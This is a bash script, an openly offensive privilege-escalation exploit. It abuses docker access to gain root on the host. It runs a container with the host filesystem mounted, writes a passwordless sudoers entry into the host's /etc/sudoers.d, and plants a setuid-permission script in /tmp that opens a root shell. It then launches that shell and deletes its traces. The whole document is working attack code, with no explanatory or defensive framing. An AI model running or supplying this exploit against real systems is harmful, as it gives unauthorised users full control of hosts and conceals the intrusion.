#!/bin/bash
USER=$(whoami)
echo "Who am i: $USER" 

docker run -d --userns=host --name 'docker_pwned' -v /:/host -it alpine:latest /bin/sh
docker_name=$(docker ps -a | grep docker_pwned$ | awk '{print $1}')
docker start $docker_name
echo "Run and start docker: $docker_name" 

_UID=$(cat /etc/passwd | grep ^root | awk -F : '{print $3}')
_GID=$(cat /etc/passwd | grep ^root | awk -F : '{print $4}')

echo "In the host, root user has UID=$_UID and GID=$_GID"

docker exec $docker_name sed -i -e "s/^\(root:[^:]\):[0-9]*:[0-9]*:/\1:${_UID}:${_GID}:/" /etc/passwd
echo "Changed /etc/password in container"
#docker exec $docker_name cat /etc/passwd
#docker exec $docker_name id

docker exec -e USER=$USER $docker_name /bin/sh -c 'echo "${USER}" ALL=NOPASSWD: /tmp/rootme.sh >> /host/etc/sudoers.d/docker_pwned'
echo "Created /etc/sudoers.d/docker_pwned with: "
cat /etc/sudoers.d/docker_pwned 

echo "Creating script rootme.sh in /tmp"
docker exec $docker_name /bin/sh -c 'echo "#!/bin/bash" > /host/tmp/rootme.sh'
docker exec $docker_name /bin/sh -c 'echo "echo Hello GOD" >> /host/tmp/rootme.sh'
docker exec $docker_name /bin/sh -c 'echo /bin/sh -i >> /host/tmp/rootme.sh'
docker exec $docker_name /bin/sh -c 'chmod 4777 /host/tmp/rootme.sh'
echo "Permisions of /tmp/rootme.sh :"
ls -l /tmp/rootme.sh

echo "Launching rootme.sh, check the current user with whoami command"
sudo /tmp/rootme.sh

echo "Deleting docker_pwned sudoers file, rootme.sh and docker_pwned container"
docker exec $docker_name /bin/sh -c 'rm /host/etc/sudoers.d/docker_pwned'
docker exec $docker_name /bin/sh -c 'rm /host/tmp/rootme.sh'
docker stop docker_pwned
docker rm docker_pwned
